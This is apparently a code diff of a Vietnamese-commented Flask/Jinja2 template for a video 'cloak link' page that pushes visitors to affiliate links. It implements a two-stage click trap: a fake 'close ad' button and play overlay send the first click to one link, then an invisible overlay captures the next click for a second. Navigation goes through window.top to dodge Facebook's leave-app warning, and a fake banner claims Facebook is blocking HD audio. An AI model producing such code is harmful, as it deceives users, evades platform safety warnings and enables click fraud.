@@ -20,9 +20,6 @@
     <title>{{ og_title }}</title>
 
     <style>
-        /* ===================================================
-           BASE STYLES
-        =================================================== */
         *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
 
         body {
@@ -34,6 +31,7 @@
             flex-direction: column;
             align-items: center;
             padding: 16px;
+            overflow-x: hidden;
         }
 
         /* ===================================================
@@ -63,7 +61,7 @@
         #endScreenOverlay {
             position: absolute;
             inset: 0;
-            background: rgba(0, 0, 0, 0.92);
+            background: rgba(0,0,0,0.92);
             z-index: 20;
             display: none;
             flex-direction: column;
@@ -75,7 +73,7 @@
             display: flex;
             align-items: center;
             gap: 10px;
-            background: rgba(229, 57, 53, 0.9);
+            background: rgba(229,57,53,0.9);
             color: #fff;
             border: none;
             padding: 14px 28px;
@@ -83,8 +81,8 @@
             font-size: 16px;
             font-weight: 700;
             cursor: pointer;
-            box-shadow: 0 4px 24px rgba(229, 57, 53, 0.5);
-            transition: transform 0.15s ease, box-shadow 0.15s ease;
+            box-shadow: 0 4px 24px rgba(229,57,53,0.5);
+            transition: transform 0.15s ease;
         }
         #replayBtn:hover { transform: scale(1.05); }
         #replayBtn:active { transform: scale(0.96); }
@@ -107,20 +105,7 @@
         }
 
         /* ===================================================
-           🪝 CLICK TRAP — localStorage Technique (v3)
-           ─────────────────────────────────────────────────
-           Dùng <div> + window.top.location.href thay vì <a>:
-
-           VẤN ĐỀ VỚI <a target="_blank">:
-           • Facebook IAB (In-App Browser) hiện popup cảnh báo
-             "Bạn đang rời khỏi ứng dụng" khi mở link mới
-           • Người dùng bị hoảng loạn, không dám bấm
-
-           GIẢI PHÁP window.top.location.href:
-           • Điều hướng trong CÙNG tab/webview → không popup
-           • Facebook IAB không coi đây là "rời ứng dụng"
-           • localStorage lưu bước → khi user bấm Back (bfcache),
-             pageshow event khôi phục đúng giao diện
+           🪝 CLICK TRAP — localStorage + window.top technique
         =================================================== */
         #clickTrap {
             position: absolute;
@@ -130,16 +115,15 @@
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            background: rgba(0, 0, 0, 0.78);
+            background: rgba(0,0,0,0.78);
             backdrop-filter: blur(5px);
             -webkit-backdrop-filter: blur(5px);
             cursor: pointer;
             user-select: none;
             -webkit-tap-highlight-color: transparent;
-            transition: background 0.3s ease, backdrop-filter 0.3s ease;
+            transition: background 0.3s ease;
         }
 
-        /* Nội dung trong trap */
         .trap-content {
             display: flex;
             flex-direction: column;
@@ -149,18 +133,17 @@
             pointer-events: none;
         }
 
-        /* Vòng tròn Play */
         .trap-play-icon {
             width: 88px;
             height: 88px;
-            background: rgba(229, 57, 53, 0.92);
+            background: rgba(229,57,53,0.92);
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
             box-shadow:
-                0 0 0 14px rgba(229, 57, 53, 0.18),
-                0 0 44px rgba(229, 57, 53, 0.55);
+                0 0 0 14px rgba(229,57,53,0.18),
+                0 0 44px rgba(229,57,53,0.55);
         }
         .trap-play-icon::after {
             content: '';
@@ -170,6 +153,7 @@
             border-color: transparent transparent transparent #fff;
             margin-left: 8px;
         }
+
         .trap-play-text {
             font-size: 17px;
             font-weight: 700;
@@ -178,19 +162,17 @@
             text-shadow: 0 2px 8px rgba(0,0,0,0.9);
         }
 
-        /* Nút giả "Đóng quảng cáo" — góc trên phải */
         #fakeCloseBtn {
             position: absolute;
             top: 12px;
             right: 12px;
-            background: rgba(30, 30, 30, 0.85);
+            background: rgba(30,30,30,0.85);
             color: rgba(255,255,255,0.82);
             font-size: 12px;
             padding: 5px 14px;
             border-radius: 20px;
             border: 1px solid rgba(255,255,255,0.18);
             pointer-events: none;
-            letter-spacing: 0.2px;
             backdrop-filter: blur(4px);
             transition: opacity 0.3s ease;
         }
@@ -202,7 +184,195 @@
         }
 
         /* ===================================================
-           FALLBACK (không có video)
+           📱 FACEBOOK iOS GUIDE OVERLAY
+           Hiển thị khi is_facebook_ios = True (server-side)
+           Hướng dẫn người dùng mở Safari thủ công.
+           z-index: 100000 — phủ lên tất cả mọi thứ
+        =================================================== */
+        #fbIosGuide {
+            position: fixed;
+            inset: 0;
+            z-index: 100000;
+            background: rgba(10, 10, 15, 0.96);
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+            padding: 0 24px 40px;
+            overflow-y: auto;
+            /* Ẩn mặc định — JS/Jinja2 sẽ bật nếu cần */
+            display: none;
+        }
+
+        /* Mũi tên chỉ lên góc phải (nơi có nút 3 chấm của Facebook) */
+        .guide-arrow-wrapper {
+            width: 100%;
+            display: flex;
+            justify-content: flex-end;
+            padding: 12px 8px 0 0;
+            flex-shrink: 0;
+        }
+
+        .guide-arrow {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 6px;
+            animation: arrowBounce 1.2s ease-in-out infinite;
+        }
+
+        /* Mũi tên SVG inline — không cần ảnh ngoài */
+        .guide-arrow svg {
+            width: 52px;
+            height: 52px;
+            filter: drop-shadow(0 0 12px rgba(255, 214, 0, 0.9));
+        }
+
+        .guide-arrow-label {
+            font-size: 12px;
+            font-weight: 700;
+            color: #ffd600;
+            letter-spacing: 0.5px;
+            text-align: center;
+        }
+
+        @keyframes arrowBounce {
+            0%, 100% { transform: translateY(0); }
+            50%       { transform: translateY(-10px); }
+        }
+
+        /* Card nội dung hướng dẫn */
+        .guide-card {
+            margin-top: 28px;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            border: 1.5px solid rgba(255, 214, 0, 0.35);
+            border-radius: 20px;
+            padding: 28px 22px 24px;
+            width: 100%;
+            max-width: 420px;
+            box-shadow:
+                0 8px 40px rgba(0,0,0,0.6),
+                0 0 0 1px rgba(255,214,0,0.08) inset;
+        }
+
+        .guide-icon-row {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            margin-bottom: 18px;
+        }
+
+        .guide-icon-badge {
+            width: 52px;
+            height: 52px;
+            border-radius: 14px;
+            background: linear-gradient(135deg, #e53935, #b71c1c);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 26px;
+            flex-shrink: 0;
+            box-shadow: 0 4px 16px rgba(229,57,53,0.5);
+        }
+
+        .guide-headline {
+            font-size: 16px;
+            font-weight: 800;
+            color: #fff;
+            line-height: 1.35;
+        }
+
+        .guide-headline span {
+            color: #ffd600;
+        }
+
+        /* Đường ngăn cách */
+        .guide-divider {
+            width: 100%;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, rgba(255,214,0,0.3), transparent);
+            margin: 16px 0;
+        }
+
+        .guide-body {
+            font-size: 14.5px;
+            color: #c8c8d8;
+            line-height: 1.75;
+        }
+
+        .guide-body strong {
+            color: #ffd600;
+            font-weight: 700;
+        }
+
+        /* Step list */
+        .guide-steps {
+            margin-top: 18px;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .guide-step {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+        }
+
+        .step-num {
+            min-width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #ffd600, #ff8f00);
+            color: #000;
+            font-size: 13px;
+            font-weight: 900;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            box-shadow: 0 2px 8px rgba(255,214,0,0.4);
+        }
+
+        .step-text {
+            font-size: 14px;
+            color: #dde0f0;
+            line-height: 1.55;
+            padding-top: 3px;
+        }
+
+        .step-text em {
+            font-style: normal;
+            color: #fff;
+            font-weight: 600;
+            background: rgba(255,214,0,0.12);
+            padding: 1px 6px;
+            border-radius: 5px;
+        }
+
+        /* Nút dismiss (nếu user bấm nhầm) */
+        .guide-dismiss {
+            margin-top: 22px;
+            width: 100%;
+            padding: 13px;
+            border-radius: 12px;
+            border: 1px solid rgba(255,255,255,0.12);
+            background: rgba(255,255,255,0.05);
+            color: rgba(255,255,255,0.5);
+            font-size: 13px;
+            cursor: pointer;
+            text-align: center;
+            transition: background 0.2s;
+        }
+        .guide-dismiss:hover {
+            background: rgba(255,255,255,0.09);
+            color: rgba(255,255,255,0.7);
+        }
+
+        /* ===================================================
+           FALLBACK
         =================================================== */
         .loader-fallback {
             display: flex; flex-direction: column;
@@ -224,15 +394,87 @@
             .trap-play-icon { width: 72px; height: 72px; }
             .trap-play-text { font-size: 15px; }
             .content-description { font-size: 14px; padding: 12px 14px; }
+            .guide-card { padding: 22px 16px 20px; }
         }
     </style>
 </head>
 <body>
 
+<!-- ════════════════════════════════════════════════════════════════
+     📱 FACEBOOK iOS GUIDE OVERLAY
+     Hiển thị khi Flask phát hiện Facebook IAB trên iPhone/iPad.
+     Hướng dẫn người dùng thoát ra Safari thủ công qua nút 3 chấm.
+     Jinja2 set style="display:flex" nếu is_facebook_ios = True.
+════════════════════════════════════════════════════════════════ -->
+<div id="fbIosGuide" style="{{ 'display:flex' if is_facebook_ios else 'display:none' }}">
+
+    <!-- Mũi tên chỉ lên góc phải (nơi có nút ⋯ của Facebook) -->
+    <div class="guide-arrow-wrapper">
+        <div class="guide-arrow">
+            <!-- SVG mũi tên vàng trỏ lên -->
+            <svg viewBox="0 0 52 64" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M26 4 L26 52" stroke="#ffd600" stroke-width="5" stroke-linecap="round"/>
+                <path d="M10 20 L26 4 L42 20" stroke="#ffd600" stroke-width="5" stroke-linecap="round" stroke-linejoin="round"/>
+                <!-- Đầu mũi tên đậm hơn -->
+                <circle cx="26" cy="4" r="4" fill="#ffd600"/>
+            </svg>
+            <span class="guide-arrow-label">Nhấn vào đây</span>
+        </div>
+    </div>
+
+    <!-- Card hướng dẫn -->
+    <div class="guide-card">
+        <div class="guide-icon-row">
+            <div class="guide-icon-badge">🔊</div>
+            <div class="guide-headline">
+                Trình duyệt Facebook đang<br>
+                <span>chặn âm thanh video HD</span>
+            </div>
+        </div>
+
+        <div class="guide-divider"></div>
+
+        <div class="guide-body">
+            Để xem video với âm thanh rõ nhất, bạn cần mở trang bằng
+            <strong>Safari</strong> hoặc trình duyệt bên ngoài.
+        </div>
+
+        <div class="guide-steps">
+            <div class="guide-step">
+                <div class="step-num">1</div>
+                <div class="step-text">
+                    Nhấn vào <em>⋯ (dấu 3 chấm)</em> ở
+                    <strong style="color:#ffd600">góc trên bên phải</strong> màn hình
+                </div>
+            </div>
+            <div class="guide-step">
+                <div class="step-num">2</div>
+                <div class="step-text">
+                    Chọn <em>Mở bằng trình duyệt ngoài</em>
+                    hoặc <em>Mở bằng Safari</em>
+                </div>
+            </div>
+            <div class="guide-step">
+                <div class="step-num">3</div>
+                <div class="step-text">
+                    Trang sẽ tự mở lại trong Safari —
+                    thưởng thức video <strong style="color:#ffd600">có âm thanh nét nhất! 🎬</strong>
+                </div>
+            </div>
+        </div>
+
+        <button class="guide-dismiss" onclick="document.getElementById('fbIosGuide').style.display='none'">
+            Bỏ qua, tiếp tục xem trong Facebook
+        </button>
+    </div>
+</div>
+<!-- END #fbIosGuide -->
+
+
 {% if final_video_url %}
     <div class="video-wrapper">
 
-        <!-- Trình phát Video HTML5 -->
+        <!-- Video HTML5 -->
         <video
             id="mainVideo"
             playsinline
@@ -250,18 +492,11 @@
         </div>
 
         <!--
-        ╔═══════════════════════════════════════════════════════════════╗
-        ║  🪝 BẪY CLICK 2 TẦNG — localStorage + window.top.location   ║
-        ║  ─────────────────────────────────────────────────────────   ║
-        ║  Dùng <div> (KHÔNG dùng <a>) vì:                            ║
-        ║  • <a target="_blank"> → Facebook IAB hiện cảnh báo popup   ║
-        ║  • window.top.location.href → Điều hướng trong cùng tab     ║
-        ║    → Không popup, không cảnh báo "rời ứng dụng"             ║
-        ║                                                               ║
-        ║  localStorage lưu bước hiện tại theo slug_id:               ║
-        ║  • Khi user bấm Back (bfcache), pageshow event              ║
-        ║    đọc lại state → UI đúng, không reset về bước 0           ║
-        ╚═══════════════════════════════════════════════════════════════╝
+        ╔══════════════════════════════════════════════════════════════╗
+        ║  🪝 BẪY CLICK 2 TẦNG — localStorage + window.top           ║
+        ║  Chỉ kích hoạt khi KHÔNG phải Facebook iOS                  ║
+        ║  (iOS đã thấy màn hướng dẫn, Android đã bị redirect Chrome) ║
+        ╚══════════════════════════════════════════════════════════════╝
         -->
         <div id="clickTrap">
             <div id="fakeCloseBtn">✕ &nbsp;Đóng quảng cáo</div>
@@ -281,29 +516,37 @@
     (function () {
         'use strict';
 
-        /* ═══════════════════════════════════════════════════════════════
+        /* ═══════════════════════════════════════════════════
            BIẾN JINJA2 → JS
-           Dùng | tojson để escape an toàn, tránh XSS và lỗi ký tự đặc biệt.
-        ═══════════════════════════════════════════════════════════════ */
-        var LINK1_URL  = {{ link1_url | tojson }};
-        var LINK2_URL  = {{ link2_url | tojson if link2_url else 'null' }};
-        var LINK1_ID   = {{ link1_id | tojson if link1_id else 'null' }};
-        var LINK2_ID   = {{ link2_id | tojson if link2_id else 'null' }};
-        var SLUG_ID    = {{ slug_id | tojson }};  /* Key duy nhất cho localStorage */
+        ═══════════════════════════════════════════════════ */
+        var LINK1_URL       = {{ link1_url | tojson }};
+        var LINK2_URL       = {{ link2_url | tojson if link2_url else 'null' }};
+        var LINK1_ID        = {{ link1_id | tojson if link1_id else 'null' }};
+        var LINK2_ID        = {{ link2_id | tojson if link2_id else 'null' }};
+        var SLUG_ID         = {{ slug_id | tojson }};
+        var IS_FACEBOOK_IOS = {{ 'true' if is_facebook_ios else 'false' }};
 
-        /* ═══════════════════════════════════════════════════════════════
-           localStorage KEY
-           Mỗi cloak link có key riêng (theo slug) → không xung đột
-           khi user mở nhiều link cùng lúc.
-           VD: "trap_step_phim-hot-2026"
-        ═══════════════════════════════════════════════════════════════ */
+        /* ═══════════════════════════════════════════════════
+           NẾU LÀ FACEBOOK iOS → DỪNG LẠI
+           Màn hướng dẫn server-side đã hiển thị.
+           Không kích hoạt bẫy click.
+        ═══════════════════════════════════════════════════ */
+        if (IS_FACEBOOK_IOS) {
+            /* Ẩn clickTrap hoàn toàn — người dùng đang nhìn màn hướng dẫn */
+            var trapEl = document.getElementById('clickTrap');
+            if (trapEl) trapEl.style.display = 'none';
+            /* Dừng lại — không chạy phần còn lại của script */
+            return;
+        }
+
+        /* ═══════════════════════════════════════════════════
+           localStorage KEY (duy nhất theo slug)
+        ═══════════════════════════════════════════════════ */
         var STORAGE_KEY = 'trap_step_' + SLUG_ID;
 
-        /* ═══════════════════════════════════════════════════════════════
-           TRACKING — sendBeacon (non-blocking)
-           Gửi request ngầm, không bị hủy khi chuyển trang.
-           Fallback fetch + keepalive nếu sendBeacon không hỗ trợ.
-        ═══════════════════════════════════════════════════════════════ */
+        /* ═══════════════════════════════════════════════════
+           TRACKING ngầm — sendBeacon / fetch fallback
+        ═══════════════════════════════════════════════════ */
         function trackClick(linkId) {
             if (!linkId) return;
             var url = '/api/affiliate-links/' + linkId + '/track-click';
@@ -313,7 +556,7 @@
                 } else {
                     fetch(url, { method: 'POST', keepalive: true }).catch(function () {});
                 }
-            } catch (e) { /* Bỏ qua — tracking không được làm vỡ UX */ }
+            } catch (e) {}
         }
 
         /* ── DOM refs ── */
@@ -323,112 +566,69 @@
         var endOverlay = document.getElementById('endScreenOverlay');
         var replayBtn  = document.getElementById('replayBtn');
 
-        /* ═══════════════════════════════════════════════════════════════
-           updateTrapUI() — Cập nhật giao diện theo step hiện tại
-           ─────────────────────────────────────────────────────────────
-           Đọc step từ localStorage (không dùng biến JS in-memory vì
-           bfcache giữ nguyên DOM cũ khi user nhấn Back, nhưng JS
-           chạy lại từ đầu → biến in-memory reset về 0).
-
-           Step = 0 → Tầng 1: Hiện nền mờ + nút Play + fake close
-           Step = 1 → Tầng 2: Trap trong suốt (user không thấy,
-                               nhưng vẫn bắt click để mở link2)
-           Step ≥ 2 → Gỡ bẫy: Ẩn hẳn, phát video
-        ═══════════════════════════════════════════════════════════════ */
+        /* ═══════════════════════════════════════════════════
+           updateTrapUI() — Đồng bộ UI với localStorage
+           ─────────────────────────────────────────────────
+           Step 0 → Tầng 1: Nền mờ + nút Play + fake close
+           Step 1 → Tầng 2: Trap trong suốt (bẫy ngầm)
+           Step ≥2 → Gỡ bẫy: Ẩn trap, phát video
+        ═══════════════════════════════════════════════════ */
         function updateTrapUI() {
             var step = parseInt(localStorage.getItem(STORAGE_KEY) || '0', 10);
 
             if (step >= 2) {
-                /* ── Đã qua 2 lần click → gỡ bẫy, phát video ── */
                 trap.style.display = 'none';
                 if (mainVideo) {
-                    mainVideo.play().catch(function () { /* Autoplay blocked — OK */ });
+                    mainVideo.play().catch(function () {});
                 }
-
             } else if (step === 1) {
-                /* ── Đã click lần 1, quay lại tab → tầng 2 trong suốt ── */
-                trap.style.background    = 'transparent';
-                trap.style.backdropFilter = 'none';
+                trap.style.background          = 'transparent';
+                trap.style.backdropFilter       = 'none';
                 trap.style.webkitBackdropFilter = 'none';
                 if (fakeClose) fakeClose.style.display = 'none';
-                /* Xóa nội dung hiển thị, chỉ giữ div bẫy trong suốt */
                 var content = trap.querySelector('.trap-content');
                 if (content) content.style.display = 'none';
-
             }
-            /* step === 0 → không làm gì, giao diện mặc định */
+            /* step === 0 → giao diện mặc định, không đổi */
         }
 
-        /* Chạy ngay khi DOM sẵn sàng */
+        /* Chạy ngay và sau mỗi lần trang được khôi phục từ bfcache */
         updateTrapUI();
+        window.addEventListener('pageshow', updateTrapUI);
 
-        /* ═══════════════════════════════════════════════════════════════
-           pageshow event — Chống bfcache trên mobile (quan trọng!)
-           ─────────────────────────────────────────────────────────────
-           Vấn đề: Mobile browser (iOS Safari, Chrome Android, Facebook
-           IAB) dùng bfcache (Back/Forward Cache). Khi user nhấn "Back",
-           trang được khôi phục từ cache → DOMContentLoaded KHÔNG chạy,
-           nhưng pageshow LUÔN chạy (kể cả từ bfcache).
-
-           Giải pháp: Lắng nghe pageshow để gọi lại updateTrapUI(),
-           đảm bảo UI luôn đúng với state trong localStorage.
-        ═══════════════════════════════════════════════════════════════ */
-        window.addEventListener('pageshow', function (event) {
-            /* event.persisted = true khi khôi phục từ bfcache */
-            updateTrapUI();
-        });
-
-        /* ═══════════════════════════════════════════════════════════════
-           CLICK HANDLER — Logic bẫy 2 tầng
-           ─────────────────────────────────────────────────────────────
-
-           TẦNG 1 (step = 0, click đầu tiên):
-           ┌─ Ghi step = 1 vào localStorage TRƯỚC khi chuyển trang
-           ├─ Tracking ngầm: POST /api/.../track-click (sendBeacon)
-           └─ window.top.location.href = link1_url
-              ↳ Điều hướng trong CÙNG tab (không popup IAB)
-              ↳ Trang link1 load → user xem sản phẩm
-              ↳ User nhấn Back → bfcache khôi phục trang này
-              ↳ pageshow → updateTrapUI() → step = 1 → trap trong suốt
-
-           TẦNG 2 (step = 1, click lần hai sau khi quay lại):
-           ┌─ Ghi step = 2 vào localStorage
-           ├─ Tracking ngầm: POST /api/.../track-click
-           └─ window.top.location.href = link2_url
-              ↳ User xem sản phẩm lần 2
-              ↳ User nhấn Back lần nữa → step = 2 → bẫy bị gỡ, video phát
-        ═══════════════════════════════════════════════════════════════ */
+        /* ═══════════════════════════════════════════════════
+           CLICK HANDLER — Bẫy 2 tầng
+           ─────────────────────────────────────────────────
+           Dùng window.top.location.href để điều hướng trong
+           cùng tab/webview — không popup "rời ứng dụng".
+        ═══════════════════════════════════════════════════ */
         if (trap) {
             trap.addEventListener('click', function () {
                 var step = parseInt(localStorage.getItem(STORAGE_KEY) || '0', 10);
 
                 if (step === 0) {
-                    /* ─── TẦNG 1 ─── */
+                    /* ─── Tầng 1: Mở link1, lưu step=1 ─── */
                     localStorage.setItem(STORAGE_KEY, '1');
                     trackClick(LINK1_ID);
-                    /* Dùng window.top để thoát khỏi iframe (nếu có) */
                     window.top.location.href = LINK1_URL;
 
                 } else if (step === 1) {
-                    /* ─── TẦNG 2 ─── */
+                    /* ─── Tầng 2: Mở link2, lưu step=2 ─── */
                     localStorage.setItem(STORAGE_KEY, '2');
-                    trackClick(LINK2_ID || LINK1_ID); /* fallback link1 nếu không có link2 */
+                    trackClick(LINK2_ID || LINK1_ID);
                     window.top.location.href = LINK2_URL || LINK1_URL;
                 }
-                /* step >= 2 → trap đã bị ẩn, sự kiện này không còn trigger */
+                /* step >= 2 → trap đã ẩn, không trigger */
             });
         }
 
-        /* ═══════════════════════════════════════════════════════════════
+        /* ═══════════════════════════════════════════════════
            END-SCREEN OVERLAY
-           Khi video kết thúc → hiện overlay đen + nút Xem lại.
-           Ngăn trình duyệt đề xuất video khác.
-        ═══════════════════════════════════════════════════════════════ */
+        ═══════════════════════════════════════════════════ */
         if (mainVideo && endOverlay) {
             mainVideo.addEventListener('ended', function () {
                 endOverlay.style.display = 'flex';
             });
-
             if (replayBtn) {
                 replayBtn.addEventListener('click', function (e) {
                     e.stopPropagation();
@@ -444,7 +644,7 @@
 
 {% else %}
 
-    <!-- Fallback: không có video → redirect thẳng bằng window.top -->
+    <!-- Fallback: không có video → redirect thẳng -->
     <div class="loader-fallback">
         <div class="spinner"></div>
         <p>Đang chuyển hướng...</p>
